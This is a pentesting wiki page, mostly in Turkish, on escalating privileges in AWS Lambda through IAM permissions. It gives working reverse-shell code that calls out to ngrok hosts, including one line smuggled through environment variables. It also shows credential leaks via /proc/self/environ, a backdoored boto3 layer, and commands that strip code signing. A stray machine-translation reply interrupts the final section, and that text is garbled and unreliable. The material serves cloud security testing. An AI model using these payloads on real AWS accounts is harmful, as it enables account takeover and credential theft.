# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

More info about lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Bu izinlere sahip kullanıcılar ayrıcalıklarını yükseltebilir: **`iam:PassRole`, `lambda:CreateFunction`, ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilir.\
Onlar **yeni bir Lambda function oluşturup mevcut bir IAM role atayabilirler**, bu sayede fonksiyona o role ait izinler verilmiş olur. Kullanıcı daha sonra bu Lambda function'a **kod yazıp yükleyebilir (örneğin bir rev shell ile)**.\
Fonksiyon kurulduktan sonra kullanıcı AWS API aracılığıyla Lambda function'ı çağırarak **çalıştırılmasını tetikleyebilir** ve istenen işlemleri gerçekleştirebilir. Bu yöntem, kullanıcının ilişkili IAM role tarafından verilen erişim düzeyiyle Lambda function üzerinden dolaylı olarak işlem yapmasına olanak tanır.\\

Bir saldırgan bunu kötüye kullanarak **rev shell elde edebilir ve token'ı çalabilir**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Ayrıca lambda function'ın kendisinden **abuse the lambda role permissions** yapabilirsiniz.\
Eğer lambda role yeterli izinlere sahipse, bunu kendinize yönetici hakları vermek için kullanabilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Harici bir bağlantıya ihtiyaç duymadan lambda'nın role kimlik bilgilerini leak etmek de mümkündür. Bu, dahili görevler için kullanılan **Network isolated Lambdas** için faydalı olacaktır. Eğer bilinmeyen security groups reverse shells'inizi filtreliyorsa, bu kod parçası lambda çıktısı olarak kimlik bilgilerini doğrudan leak etmenize olanak tanır.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potential Impact:** Belirtilen keyfi lambda service role üzerinde doğrudan privesc.

> [!CAUTION]
> Şunu unutmayın: ilginç görünse bile **`lambda:InvokeAsync`** tek başına **`aws lambda invoke-async`** komutunu çalıştırmaya izin vermez; ayrıca `lambda:InvokeFunction` gerekir

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **kendinize `lambda:InvokeFunction` iznini verebilirsiniz** eğer **`lambda:AddPermission`** iznine sahipseniz.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Belirtilen rastgele lambda servis rolüne doğrudan privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Kullanıcılar **`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine (ve muhtemelen `dynamodb:PutItem` ve `dynamodb:CreateTable`) sahip olduklarında, `lambda:InvokeFunction` olmadan bile dolaylı olarak **escalate privileges** gerçekleştirebilirler.\
Kötü amaçlı kod içeren bir **Lambda function** oluşturup mevcut bir IAM rolü atayabilirler.

Lambda'yı doğrudan çağırmak yerine, kullanıcı mevcut bir DynamoDB tablosu oluşturur veya kullanır ve bunu bir event source mapping aracılığıyla Lambda'ya bağlar. Bu yapılandırma, tabloya yeni bir öğe eklendiğinde (kullanıcının kendisi tarafından veya başka bir süreç tarafından) Lambda function'ın otomatik olarak tetiklenmesini sağlar; böylece Lambda dolaylı olarak çağrılır ve geçirilen IAM rolünün izinleriyle kod çalıştırılır.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer DynamoDB AWS ortamında zaten aktifse, kullanıcı yalnızca Lambda fonksiyonu için **event source mapping** oluşturmalıdır. Ancak DynamoDB kullanılmıyorsa, kullanıcı **streaming etkinleştirilmiş yeni bir tablo oluşturmalıdır**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Artık **Lambda fonksiyonunu DynamoDB tablosuna bağlamak** için **event source mapping oluşturarak**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda fonksiyonu DynamoDB stream'e bağlı olduğunda, saldırgan **DynamoDB stream'i etkinleştirerek Lambda'yı dolaylı olarak tetikleyebilir**. Bu, DynamoDB tablosuna **bir öğe ekleyerek** gerçekleştirilebilir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Belirtilen lambda servis rolüne doğrudan privesc.

### `lambda:AddPermission`

Bu izne sahip bir saldırgan **kendine (veya başkalarına) herhangi bir izin verebilir** (bu, kaynağa erişim sağlamak için kaynak tabanlı politikalar oluşturur):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Olası Etki:** Kodu değiştirme ve çalıştırma izni vererek kullanılan lambda servis rolüne doğrudan privesc sağlar.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan **kendisine (veya başkalarına) `lambda:GetLayerVersion` iznini verebilir**. Katmana erişebilir ve zafiyetler veya hassas bilgiler arayabilir.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potansiyel Etki:** Hassas bilgilere potansiyel erişim.

### `lambda:UpdateFunctionCode`

Kullanıcılar **`lambda:UpdateFunctionCode`** iznine sahip olduğunda, **IAM rolüne bağlı mevcut bir Lambda fonksiyonunun kodunu değiştirme** potansiyeline sahiptir.\
Saldırgan, Lambda'nın kodunu IAM kimlik bilgilerini exfiltrate etmek için değiştirebilir.

Saldırgan fonksiyonu doğrudan çağırma yetkisine sahip olmayabilir; ancak Lambda fonksiyonu önceden mevcut ve çalışır durumdaysa, muhtemelen mevcut iş akışları veya olaylar aracılığıyla tetiklenecek ve bu da değiştirilmiş kodun dolaylı olarak yürütülmesini kolaylaştırır.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** Kullanılan lambda servis rolüne doğrudan privesc.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Bu izinlerle, Lambda'nın keyfi kod çalıştırmasına neden olacak ortam değişkenleri eklemek mümkün. Örneğin python'da `PYTHONWARNING` ve `BROWSER` ortam değişkenleri kötüye kullanılarak bir python sürecinin rastgele komutlar çalıştırması sağlanabilir:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Diğer betik dilleri için kullanabileceğiniz başka env variables vardır. Daha fazla bilgi için betik dillerinin alt bölümlerine bakın:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) ile **code** lamdba fonksiyonunuza dahil edilebilir ancak ayrı olarak saklanır; böylece fonksiyon kodu küçük kalabilir ve birden fazla fonksiyon bu kodu paylaşabilir.

lambda içinde python code'un hangi yollardan yüklendiğini aşağıdaki gibi bir fonksiyonla kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Bunlar şu konumlar:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Örneğin, boto3 kütüphanesi `/var/runtime/boto3` konumundan yüklenir (4. konum).

#### Exploitation

It's possible to abuse the permission `lambda:UpdateFunctionConfiguration` to **yeni bir layer eklemek** to a lambda function. To execute arbitrary code this layer need to contain some **lambda'nın içe aktaracağı kütüphaneler.** Eğer lambda'nın kodunu okuyabiliyorsanız bunu kolayca bulabilirsiniz; ayrıca lambda'nın **zaten bir layer kullanıyor olması** ve siz bu layer'ı **indirip** içine **kodunuzu ekleyebilmeniz** de mümkün olabilir.

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py` dosyasını açıp **global koda backdoor ekleyebilirsiniz** (örneğin credentials'leri exfiltrate eden veya bir reverse shell elde eden bir fonksiyon).

Sonra, `./lambda_layer` dizinini zipleyip **yeni lambda layer'ı** kendi hesabınıza yükleyin (ya da kurbanın hesabına, ancak bunun için yetkiniz olmayabilir).\
Dikkat: /opt/python/boto3'ü override etmek için bir python klasörü oluşturup kütüphaneleri oraya koymanız gerekir. Ayrıca, layer'in lambda tarafından kullanılan python sürümüyle **python sürümüyle uyumlu** olması ve eğer bunu kendi hesabınıza yüklüyorsanız **aynı bölgede** olması gerekir:
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Şimdi, yüklenen lambda layer'ı **herhangi bir hesaptan erişilebilir** hale getirin:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ve lambda layer'ı victim lambda function'a ekleyin:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Bir sonraki adım, eğer yapabiliyorsak fonksiyonu kendimiz **çağırmak** ya da normal yollarla **çağrılmasını beklemek** — ki bu daha güvenli yöntemdir.

Bu zafiyeti sömürmek için **daha stealth bir yöntem** şurada bulunabilir:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Olası Etki:** Kullanılan lambda service rolüne doğrudan privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Belki bu izinlerle bir function oluşturup URL'i çağırarak çalıştırabilirsiniz... ama bunu test etmenin bir yolunu bulamadım; eğer siz bulursanız haber verin!

### Lambda MitM

Bazı lambdas parametrelerde kullanıcıların **hassas bilgilerini alıyor.** Eğer bunlardan birinde RCE elde ederseniz, diğer kullanıcıların ona gönderdiği bilgileri exfiltrate edebilirsiniz; buna bakın:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Referanslar

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

İzinler (bunlardan biri):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notlar:
- Path B için, CSC policy `WARN` olarak ayarlanmışsa bir AWS Signer profiline ihtiyacınız yoktur (unsigned artifacts'e izin verilir).

Adımlar (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Küçük bir payload hazırlayın:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Yol A) CSC'yi kaldırın, ardından kodu güncelleyin:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Path B) Uyarı seviyesine düşür ve kodu güncelle (silmeye izin verilmiyorsa):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
I don't have the file contents. Lütfen çevirmemi istediğiniz src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.md dosyasının içeriğini yapıştırın veya hangi bölümü doğrulamam gerektiğini belirtin.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Olası etki: signed deployments'ı uygulaması gereken bir function içinde keyfi unsigned code yükleyip çalıştırabilme yeteneği; bu durum function role's permissions ile code execution'a yol açabilir.

Temizlik:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

